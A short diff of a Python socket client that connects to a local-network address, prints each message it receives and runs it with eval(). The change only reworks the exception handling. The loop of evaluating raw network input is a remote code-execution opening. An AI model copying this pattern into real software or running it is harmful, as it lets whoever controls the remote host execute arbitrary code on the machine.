@@ -10,14 +10,12 @@ sock.connect(('192.168.1.6', 35001))
 
 try:
     while True:
-        
+        data = str(sock.recv(1024))
+        print(data)
         try:
-            data = str(sock.recv(1024))
-            print(data)
             eval(str(data))
-
-        except:
-            print('er')
+        except Exception as e:
+            print(e)
     sock.close()
 except KeyboardInterrupt:
     print("Shutting down")
